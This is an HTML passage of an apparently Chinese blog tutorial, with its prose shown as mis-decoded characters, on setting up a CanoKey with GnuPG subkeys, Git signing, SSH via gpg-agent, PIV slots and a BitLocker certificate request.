title="OpenPGP"></a>OpenPGP</h3><p>å‚è€ƒ<a href="https://editst.com/2022/canokey-guide/#OpenPGP">Canokey æŒ‡å—ï¼šOTPï¼ŒFIDO2ï¼ŒPGP ä¸ PIV</a><br>æ‰€æœ‰å‘½ä»¤å‡åœ¨PowerShellä¸­è¿è¡Œ  </p><h4 id="1-ç”Ÿæˆä¸»å¯†é’¥"><a href="#1-ç”Ÿæˆä¸»å¯†é’¥" class="headerlink" title="1.ç”Ÿæˆä¸»å¯†é’¥"></a>1.ç”Ÿæˆä¸»å¯†é’¥</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">$ gpg --expert --full-gen-key</span><br><span class="line"></span><br><span class="line">gpg (GnuPG) 2.3.4; Copyright (C) 2021 g10 Code GmbH</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line"></span><br><span class="line">Please select what kind of key you want:</span><br><span class="line"></span><br><span class="line">  (11) ECC (set your own capabilities)</span><br><span class="line"></span><br><span class="line">Your selection? 11</span><br><span class="line"></span><br><span class="line"># æ¨èä½¿ç”¨ ECC ç®—æ³•</span><br><span class="line"></span><br><span class="line">Possible actions for this ECC key: Sign Certify Authenticate</span><br><span class="line">Current allowed actions: Sign Certify</span><br><span class="line"></span><br><span class="line">   (S) Toggle the sign capability</span><br><span class="line"></span><br><span class="line">Your selection? s</span><br><span class="line"></span><br><span class="line"># ä¸»å¯†é’¥åªä¿ç•™ Certify åŠŸèƒ½ï¼Œå…¶ä»–åŠŸèƒ½ä½¿ç”¨å­å¯†é’¥</span><br><span class="line"></span><br><span class="line">Possible actions for this ECC key: Sign Certify Authenticate</span><br><span class="line">Current allowed actions: Certify</span><br><span class="line"></span><br><span class="line">   (Q) Finished</span><br><span class="line"></span><br><span class="line">Your selection? q</span><br><span class="line"></span><br><span class="line">Please select which elliptic curve you want:</span><br><span class="line"></span><br><span class="line">   (1) Curve 25519 *default*</span><br><span class="line"></span><br><span class="line">Your selection? 1</span><br><span class="line"></span><br><span class="line">Please specify how long the key should be valid.</span><br><span class="line"></span><br><span class="line">      &lt;n&gt;y = key expires in n years</span><br><span class="line"></span><br><span class="line">Key is valid for? (0) 10y</span><br><span class="line">Key does not expire at all</span><br><span class="line">Is this correct? (y/N) y</span><br><span class="line"></span><br><span class="line"># ä¸»å¯†é’¥å»ºè®®è®¾ç½®5-10å¹´æœ‰æ•ˆæœŸï¼Œé˜²æ­¢ç”±äºä¸ªäººåŸå› é—å¤±åä¸å¯æ§ã€‚</span><br><span class="line"></span><br><span class="line">Real name: Editst</span><br><span class="line">Email address: editst@example.com</span><br><span class="line">Comment:</span><br><span class="line">You selected this USER-ID:</span><br><span class="line">    &quot;Editst &lt;editst@example.com&gt;&quot;</span><br><span class="line"></span><br><span class="line"># è¿™é‡Œå»ºè®®ç›´æ¥è®¾ç½®æˆGitHubä¸Šçš„å¯¹åº”çš„é‚®ç®±</span><br><span class="line"></span><br><span class="line">Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o</span><br><span class="line"></span><br><span class="line">We need to generate a lot of random bytes. It is a good idea to perform</span><br><span class="line">some other action (type on the keyboard, move the mouse, utilize the</span><br><span class="line">disks) during the prime generation; this gives the random number</span><br><span class="line">generator a better chance to gain enough entropy.</span><br><span class="line"></span><br><span class="line"># Windnows ä¸‹ä¼šå¼¹å‡ºçª—å£è¾“å…¥å¯†ç ï¼Œæ³¨æ„ä¸€å®šè¦ä¿ç®¡å¥½ï¼ï¼ï¼</span><br><span class="line"></span><br><span class="line">gpg: revocation certificate stored as &#x27;C:\\Users\\XXX\\AppData\\Roaming\\gnupg\\openpgp-revocs.d\\68697537A54B1F0BFC05E1D9787E848E1A98D086.rev&#x27;</span><br><span class="line">public and secret key created and signed.</span><br><span class="line"></span><br><span class="line"># ä¼šè‡ªåŠ¨ç”ŸæˆåŠé”€è¯ä¹¦ï¼Œæ³¨æ„ä¿å­˜åˆ°å®‰å…¨çš„åœ°æ–¹</span><br><span class="line"></span><br><span class="line">pub   ed25519/787E848E1A98D086 2022-01-01 [C]</span><br><span class="line">      Key fingerprint = 6869 7537 A54B 1F0B FC05  E1D9 787E 848E 1A98 D086</span><br><span class="line">uid                              Editst &lt;editst@example.com&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-ç”Ÿæˆå­å¯†é’¥"><a href="#2-ç”Ÿæˆå­å¯†é’¥" class="headerlink" title="2.ç”Ÿæˆå­å¯†é’¥"></a>2.ç”Ÿæˆå­å¯†é’¥</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ gpg --fingerprint --keyid-format long -K</span><br><span class="line">C:\Users\XXX\AppData\Roaming\gnupg\pubring.kbx</span><br><span class="line">------------------------------------------------</span><br><span class="line">sec   ed25519/787E848E1A98D086 2022-01-01 [C]</span><br><span class="line">      Key fingerprint = 6869 7537 A54B 1F0B FC05  E1D9 787E 848E 1A98 D086</span><br><span class="line">uid                 [ultimate] Editst &lt;editst@example.com&gt;</span><br><span class="line"></span><br><span class="line">$ gpg --quick-add-key 68697537A54B1F0BFC05E1D9787E848E1A98D086 cv25519 encr 5y</span><br><span class="line">$ gpg --quick-add-key 68697537A54B1F0BFC05E1D9787E848E1A98D086 ed25519 auth 5y</span><br><span class="line">$ gpg --quick-add-key 68697537A54B1F0BFC05E1D9787E848E1A98D086 ed25519 sign 5y</span><br><span class="line"></span><br><span class="line"># å­å¯†é’¥å»ºè®®è®¾ç½®æœ€å¤š5å¹´æœ‰æ•ˆæœŸ</span><br></pre></td></tr></table></figure><p>å†æ¬¡æŸ¥çœ‹ç›®å‰çš„ç§é’¥ï¼Œå¯ä»¥çœ‹åˆ°å·²ç»åŒ…å«äº†è¿™ä¸‰ä¸ªå­å¯†é’¥ã€‚  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gpg --fingerprint --keyid-format long -K</span><br><span class="line">C:\Users\XXX\AppData\Roaming\gnupg\pubring.kbx</span><br><span class="line">------------------------------------------------</span><br><span class="line">sec   ed25519/787E848E1A98D086 2022-01-01 [C]</span><br><span class="line">      Key fingerprint = 6869 7537 A54B 1F0B FC05  E1D9 787E 848E 1A98 D086</span><br><span class="line">uid                 [ultimate] Editst &lt;editst@example.com&gt;</span><br><span class="line">ssb   ed25519/055917609C9C0D7B 2022-01-01 [S] [expires: 2024-01-01]</span><br><span class="line">      Key fingerprint = E99F 3D15 7ACF 7E24 3DC8  FFE7 0559 1760 9C9C 0D7B</span><br><span class="line">ssb   ed25519/05F4A6C335157258 2022-01-01 [A] [expires: 2024-01-01]</span><br><span class="line">      Key fingerprint = C4B9 7EEC 4060 F856 7A4D  2956 05F4 A6C3 3515 7258</span><br><span class="line">ssb   cv25519/C5B8214C3AD21C6C 2022-01-01 [E] [expires: 2024-01-01]</span><br><span class="line">      Key fingerprint = E39E E067 3233 BD73 7ED1  15F1 C5B8 214C 3AD2 1C6C</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-å¤‡ä»½-å¤‡ä»½-å¤‡ä»½"><a href="#3-å¤‡ä»½-å¤‡ä»½-å¤‡ä»½" class="headerlink" title="3.å¤‡ä»½ å¤‡ä»½ å¤‡ä»½"></a>3.å¤‡ä»½ å¤‡ä»½ å¤‡ä»½</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># å…¬é’¥</span><br><span class="line">$ gpg -ao public-key.pub --export 787E848E1A98D086</span><br><span class="line"></span><br><span class="line"># åŠé”€è¯ä¹¦</span><br><span class="line">è·¯å¾„ï¼š %APPDATA%\gnupg\openpgp-revocs.d\68697537A54B1F0BFC05E1D9787E848E1A98D086.rev</span><br><span class="line"></span><br><span class="line"># ä¸»å¯†é’¥å’Œä¸‰ä¸ªå­å¯†é’¥</span><br><span class="line">gpg -ao sec-key.asc --export-secret-key 787E848E1A98D086!</span><br><span class="line">gpg -ao sign-key.asc --export-secret-key 055917609C9C0D7B!</span><br><span class="line">gpg -ao auth-key.asc --export-secret-key 05F4A6C335157258!</span><br><span class="line">gpg -ao encr-key.asc --export-secret-key C5B8214C3AD21C6C!</span><br></pre></td></tr></table></figure><p>æŠŠè¿™äº›æ–‡ä»¶æ‹¿7zæ‰“ä¸ªåŠ å¯†å‹ç¼©åŒ…ï¼Œå¯†ç ç”¨KeePassç”Ÿæˆä¸€ä¸ªå¤Ÿé•¿çš„ä¿å­˜ï¼Œç„¶åæ‰¾ä¸ªä½ å–œæ¬¢çš„ç½‘ç›˜å­˜å¥½æˆ–è€…åˆ»å¼ å…‰ç›˜æ”¾è¡£æŸœé‡Œã€‚  </p><h4 id="4-å¯¼å…¥-Canokey"><a href="#4-å¯¼å…¥-Canokey" class="headerlink" title="4.å¯¼å…¥ Canokey"></a>4.å¯¼å…¥ Canokey</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">$ gpg --edit-card</span><br><span class="line">Reader ...........: canokeys.org OpenPGP PIV OATH 0</span><br><span class="line">Manufacturer .....: CanoKeys</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"># è¿›å…¥ Admin æ¨¡å¼</span><br><span class="line">gpg/card&gt; admin</span><br><span class="line">Admin commands are allowed</span><br><span class="line"></span><br><span class="line">gpg/card&gt; passwd</span><br><span class="line">gpg: OpenPGP card no. xxxxxxxxxxxxxxxxxxxxxxxxxxx detected</span><br><span class="line"></span><br><span class="line">1 - change PIN</span><br><span class="line">2 - unblock PIN</span><br><span class="line">3 - change Admin PIN</span><br><span class="line">4 - set the Reset Code</span><br><span class="line">Q - quit</span><br><span class="line"></span><br><span class="line"># PIN å’Œ Admin PIN æœ€å¥½éƒ½è¦æ”¹æ‰</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"># æ”¹å®Œåé€€å‡º</span><br><span class="line">gpg/card&gt;quit</span><br><span class="line"></span><br><span class="line">$ gpg --edit-key 787E848E1A98D086</span><br><span class="line"></span><br><span class="line">sec  ed25519/787E848E1A98D086</span><br><span class="line">     created: 2022-01-01  expires: never       usage: C</span><br><span class="line">     trust: ultimate      validity: ultimate</span><br><span class="line">ssb  ed25519/055917609C9C0D7B</span><br><span class="line">     created: 2022-01-01  expires: 2024-01-01  usage: S</span><br><span class="line">ssb  ed25519/05F4A6C335157258</span><br><span class="line">     created: 2022-01-01  expires: 2024-01-01  usage: A</span><br><span class="line">ssb  cv25519/C5B8214C3AD21C6C</span><br><span class="line">     created: 2022-01-01  expires: 2024-01-01  usage: E</span><br><span class="line">[ultimate] (1). Editst &lt;editst@example.com&gt;</span><br><span class="line"></span><br><span class="line">gpg&gt; key 1 # é¦–å…ˆé€‰ä¸­ç¬¬ä¸€ä¸ªå­å¯†é’¥</span><br><span class="line"></span><br><span class="line">gpg&gt; keytocard</span><br><span class="line">Please select where to store the key:</span><br><span class="line">   (1) Signature key</span><br><span class="line">Your selection? 1 # é€‰æ‹©å¯¹åº”æ’æ§½</span><br><span class="line"></span><br><span class="line"># é¦–å…ˆè¾“å…¥ OpenPGP çš„å¯†ç ï¼Œå†è¾“å…¥ OpenPGP Applet å¯¹åº”çš„ Admin PIN</span><br><span class="line"># ä¹‹åå…ˆåé€‰ key 1ï¼Œå†ä¾æ¬¡é€‰æ‹© key 2ï¼Œkey 3ï¼Œé‡å¤æ“ä½œå³å¯</span><br><span class="line"></span><br><span class="line">gpg&gt; key 1</span><br><span class="line">gpg&gt; key 2</span><br><span class="line">gpg&gt; keytocard</span><br><span class="line">Please select where to store the key:</span><br><span class="line">   (3) Authentication key</span><br><span class="line">Your selection? 3</span><br><span class="line">gpg&gt; key 2</span><br><span class="line">gpg&gt; key 3</span><br><span class="line">gpg&gt; keytocard</span><br><span class="line">Please select where to store the key:</span><br><span class="line">   (2) Encryption key</span><br><span class="line">Your selection? 2</span><br><span class="line"></span><br><span class="line">gpg&gt; save # ä¿å­˜ä¿®æ”¹</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹ Canokey çŠ¶æ€ï¼Œç¡®è®¤å¯¼å…¥æˆåŠŸ</span><br><span class="line">$ gpg --card-status</span><br><span class="line">Reader ...........: canokeys.org OpenPGP PIV OATH 0</span><br><span class="line">......</span><br><span class="line">General key info..: sub  ed25519/055917609C9C0D7B 2022-01-01 Editst &lt;editst@example.com&gt;</span><br><span class="line">sec   ed25519/787E848E1A98D086  created: 2022-01-01  expires: never</span><br><span class="line">ssb&gt;  cv25519/055917609C9C0D7B  created: 2022-01-01  expires: 2024-01-01</span><br><span class="line">                                card-no: F1D0 xxxxxxxx</span><br><span class="line">ssb&gt;  ed25519/05F4A6C335157258  created: 2022-01-01  expires: 2024-01-01</span><br><span class="line">                                card-no: F1D0 xxxxxxxx</span><br><span class="line">ssb&gt;  ed25519/C5B8214C3AD21C6C  created: 2022-01-01  expires: 2024-01-01</span><br><span class="line">                                card-no: F1D0 xxxxxxxx</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°<code>ssb&gt;</code>å°±å¯ä»¥åˆ æ‰ä¸»å¯†é’¥äº†ï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --delete-secret-keys 787E848E1A98D086</span><br></pre></td></tr></table></figure><h4 id="5-ä½¿ç”¨-Canokey"><a href="#5-ä½¿ç”¨-Canokey" class="headerlink" title="5.ä½¿ç”¨ Canokey"></a>5.ä½¿ç”¨ Canokey</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># å¯¼å…¥å…¬é’¥</span><br><span class="line">$ gpg --import public-key.pub</span><br><span class="line">$ gpg --edit-card</span><br><span class="line">$ gpg/card&gt; fetch</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹æœ¬åœ°çš„ç§é’¥ï¼Œç¡®å®šå·²ç»æŒ‡å‘äº†Canokey</span><br><span class="line">$ gpg --fingerprint --keyid-format long -K</span><br><span class="line">C:\Users\XXX\AppData\Roaming\gnupg\pubring.kbx</span><br><span class="line">------------------------------------------------</span><br><span class="line">sec#  ed25519/787E848E1A98D086 2022-01-01 [C]</span><br><span class="line">      Key fingerprint = 6869 7537 A54B 1F0B FC05  E1D9 787E 848E 1A98 D086</span><br><span class="line">uid                 [ultimate] Editst &lt;editst@example.com&gt;</span><br><span class="line">ssb&gt;  ed25519/055917609C9C0D7B 2022-01-01 [S] [expires: 2024-01-01]</span><br><span class="line">      Key fingerprint = E99F 3D15 7ACF 7E24 3DC8  FFE7 0559 1760 9C9C 0D7B</span><br><span class="line">      Card serial no. = F1D0 xxxxxxxx</span><br><span class="line">ssb&gt;  ed25519/05F4A6C335157258 2022-01-01 [A] [expires: 2024-01-01]</span><br><span class="line">      Key fingerprint = C4B9 7EEC 4060 F856 7A4D  2956 05F4 A6C3 3515 7258</span><br><span class="line">      Card serial no. = F1D0 xxxxxxxx</span><br><span class="line">ssb&gt;  cv25519/C5B8214C3AD21C6C 2022-01-01 [E] [expires: 2024-01-01]</span><br><span class="line">      Key fingerprint = E39E E067 3233 BD73 7ED1  15F1 C5B8 214C 3AD2 1C6C</span><br><span class="line">      Card serial no. = F1D0 xxxxxxxx</span><br></pre></td></tr></table></figure><h5 id="5-1-Git-Commit-ç­¾å"><a href="#5-1-Git-Commit-ç­¾å" class="headerlink" title="5.1 Git Commit ç­¾å"></a>5.1 Git Commit ç­¾å</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.signingkey 055917609C9C0D7B # å­å¯†é’¥ä¸­çš„ç­¾åï¼ˆSï¼‰å¯†é’¥</span><br><span class="line"></span><br><span class="line"># ä¹‹ååœ¨ git commit æ—¶å¢åŠ  -S å‚æ•°å³å¯ä½¿ç”¨ gpg è¿›è¡Œç­¾åï¼Œæˆ–è€…ç›´æ¥å…¨å±€å¼€å¯ï¼š</span><br><span class="line">$ git config commit.gpgsign true</span><br></pre></td></tr></table></figure><h5 id="5-2-SSH-with-gpg-agent"><a href="#5-2-SSH-with-gpg-agent" class="headerlink" title="5.2 SSH with gpg agent"></a>5.2 SSH with gpg agent</h5><p>é¦–å…ˆåœ¨<code>%AppData%\gnupg\gpg-agent.conf</code>ä¸­å†™å…¥(æ²¡æœ‰å°±æ–°å»ºä¸€ä¸ª)ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">enable-win32-openssh-support</span><br><span class="line">enable-ssh-support</span><br><span class="line">enable-putty-support</span><br></pre></td></tr></table></figure><p>ç„¶åè¿è¡Œ<code>gpg -k --with-keygrip</code>è·å– [A] Subkey çš„ Keygripï¼ˆ40ä½ï¼Œè™½ç„¶çœ‹ç€å¾ˆåƒä¸Šé¢çš„fingerprintä½†æ˜¯ä¸ä¸€æ ·ï¼‰ï¼Œå†™å…¥<code>%AppData%\gnupg\sshcontrol</code>(æ²¡æœ‰å°±æ–°å»ºä¸€ä¸ª)ï¼Œç„¶åå¼€ä»»åŠ¡ç®¡ç†å™¨ï¼Œæ‰¾åˆ°<code>gpg-agent.exe</code>ï¼Œå³é”®ç»“æŸè¿›ç¨‹æ ‘ã€‚<br>ç„¶åè¿è¡Œ<code>gpg --card-status</code>å†æŠŠgpg-agentæ‹‰èµ·æ¥ã€‚</p><p>æŸ¥çœ‹ openSSH è¯»å–åˆ°çš„å…¬é’¥ä¿¡æ¯ï¼ŒæŠŠè¾“å‡ºçš„å…¬é’¥ä¿¡æ¯æ·»åŠ åˆ°æœåŠ¡å™¨çš„<code>~/.ssh/authorized_keys</code>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-add -L</span><br><span class="line"></span><br><span class="line">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAzFAR5puWAj0OflZJVzAJqejVEZCap2NhFJbzedYwX2 cardno:F1D0 xxxxxxxx</span><br></pre></td></tr></table></figure><p>Puttyè®¾ç½®ï¼š<br><img src="/pictures/canokey-canary/3.png">  </p><p>MobaXtermè®¾ç½®ï¼š<br><img src="/pictures/canokey-canary/4.png">  </p><h3 id="PIV"><a href="#PIV" class="headerlink" title="PIV"></a>PIV</h3><p>CanoKey Canary 3.0.0ç‰ˆæœ¬çš„å›ºä»¶æ˜¯æœ‰bugçš„ï¼Œå‚è§ï¼š<a href="https://docs.canokeys.org/zh-hans/userguide/piv/#11-%E6%94%AF%E6%8C%81%E7%AE%97%E6%B3%95">https://docs.canokeys.org/</a> ä½†æ˜¯é—®é¢˜ä¸å¤§ï¼Œå› ä¸ºPIVä¸€èˆ¬æ ¹æœ¬ç”¨ä¸åˆ°25519<br>CanoKeyæœ‰4ä¸ªå¯ä»¥ç”¨çš„å¯†é’¥æ§½ï¼ˆä¸ç®—82ã€83ï¼‰ï¼š<br>&emsp;&emsp;9Aï¼šPIV Authentication<br>&emsp;&emsp;9Eï¼šCard Authentication<br>&emsp;&emsp;9Cï¼šDigital Signature<br>&emsp;&emsp;9Dï¼šKey Management<br>è™½ç„¶å†™äº†æ¯ä¸ªå¯†é’¥æ§½æ˜¯åšä»€ä¹ˆçš„ï¼Œä½†æ˜¯å…¶å®ä½ å®Œå…¨ä¸ç”¨ç®¡ï¼Œå®é™…ä½¿ç”¨æ—¶å¤§å¤šå¯ä»¥æƒ³å¡å“ªå„¿å°±å¡å“ªå„¿ã€‚<br>ä½†æ˜¯æœ‰ä¸ªå®¹æ˜“å¼•å‘äººå¼ºè¿«ç—‡çš„äº‹éœ€è¦æ³¨æ„ï¼Œå½“OpenSCè¯»å–å¡ä¿¡æ¯çš„æ—¶å€™ï¼Œä¼šä»¥<code>9a-&gt;9c-&gt;9d-&gt;9e</code>çš„é¡ºåºè¯»ï¼Œä¹Ÿå°±æ˜¯è¯´å‡å¦‚ä½ åœ¨<code>9c</code>æ§½å­˜äº†ä¸€ä¸ª<code>CN=Disappear9 &#39;s CanoKey</code>çš„è¯ä¹¦ï¼Œé‚£ä¹ˆä¸ç®¡åé¢æ§½ä½çš„è¯ä¹¦CNå†…å®¹æ˜¯ä»€ä¹ˆï¼Œè¯»å¡æ—¶ä¿¡æ¯éƒ½ä¼šä¸€ç›´æ˜¾ç¤ºä¸º<code>9c</code>çš„CNï¼Œç›´åˆ°<code>9a</code>å­˜äº†è¯ä¹¦ã€‚<br>ä¾‹å¦‚ï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">yubico-piv-tool -r canokey -a status</span><br><span class="line">Version:        5.7.0</span><br><span class="line">Slot 9a:</span><br><span class="line">        Algorithm:      RSA2048</span><br><span class="line">        Subject DN:     CN=Disappear9 &#x27;s CanoKey, O=D9Lab, C=CN</span><br><span class="line">        Issuer DN:      CN=Disappear9 &#x27;s CanoKey, O=D9Lab, C=CN</span><br><span class="line">Slot 9c:</span><br><span class="line">        Algorithm:      RSA2048</span><br><span class="line">        Subject DN:     CN=disappear9@outlook.com</span><br><span class="line">        Issuer DN:      C=IT, ST=Bergamo, L=Ponte San Pietro, O=Actalis S.p.A., CN=Actalis Client Authentication CA G3</span><br><span class="line">Slot 9d:</span><br><span class="line">        Algorithm:      RSA2048</span><br><span class="line">        Subject DN:     CN=TEST</span><br><span class="line">        Issuer DN:      CN=TEST</span><br><span class="line">PIN tries left: 3</span><br></pre></td></tr></table></figure><p>åœ¨<code>Thunderbird</code>ä¸­æŸ¥çœ‹æ—¶ï¼š<br><img src="/pictures/canokey-canary/5.png">  </p><p>æ‰€ä»¥å¦‚æœä½ å’Œæˆ‘ä¸€æ ·å®¹æ˜“çªç„¶çŠ¯å¼ºè¿«ç—‡ï¼Œé‚£ä¹ˆå¯ä»¥è‡ªå·±ç”Ÿæˆä¸€ä¸ªç»™Bitlockerç”¨çš„è¯ä¹¦æ”¾<code>9a</code>ã€‚  </p><h4 id="Bitlocker"><a href="#Bitlocker" class="headerlink" title="Bitlocker"></a>Bitlocker</h4><p>æ–°å»ºä¸€ä¸ª<code>certreqcfg.ini</code>æ–‡ä»¶<br>æ³¨æ„ï¼šå…¶ä¸­çš„<code>Subject</code>ï¼Œ<code>NotBefore</code>ï¼Œ<code>NotAfter</code>ï¼Œè¿™å‡ é¡¹æ˜¯å¯ä»¥éšæ„æ›´æ”¹çš„ï¼Œå‰©ä¸‹çš„ä¸è¦åŠ¨ï¼Œå°¤å…¶æ˜¯æœ‰äº›äººï¼ˆæ¯”å¦‚æˆ‘ï¼‰çœ‹åˆ°2048ä½RSAä¼šæ„Ÿè§‰å•Šå¥½ä¸å®‰å…¨ç„¶åæ”¹æˆ4096ï¼Œè¯ä¹¦èƒ½ç”Ÿæˆèƒ½å¯¼å…¥Bitlockerä¹Ÿèƒ½æ­£å¸¸è¯»åˆ°åŠ é”ï¼Œç„¶åè§£å¯†çš„æ—¶å€™å°±ä¼šçªå‘æ¶ç–¾æ™ºèƒ½å¡æ— æ•ˆå¯¼è‡´ä½ åªèƒ½ç”¨æ¢å¤å¯†é’¥è§£å¯†ï¼ˆè‡³å°‘æˆ‘åœ¨win10 LTSC 21H2 å’Œ win11 LTSCä¸Šå®éªŒè¿‡å…¨æ˜¯è¿™æ ·ï¼‰ã€‚</p><figure class="highlight ini"><figcaption><span>certreqcfg.ini</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[NewRequest]</span></span><br><span class="line"><span class="attr">Subject</span> = <span class="string">&quot;C=CN,O=D9Lab,CN=Disappear9 &#x27;s CanoKey&quot;</span></span><br><span class="line"><span class="attr">NotBefore</span> = <span class="number">2025</span>/<span class="number">01</span>/<span class="number">01</span> <span class="number">00</span>:<span class="number">00</span> AM</span><br><span class="line"><span class="attr">NotAfter</span> = <span class="number">2035</span>/<span class="number">01</span>/<span class="number">01</span> <span class="number">00</span>:<span class="number">00</span> AM</span><br><span class="line"><span class="attr">Exportable</span> = <span class="literal">TRUE</span></span><br><span class="line"><span class="attr">KeyLength</span> = <span class="number">2048</span></span><br><span class="line"><span 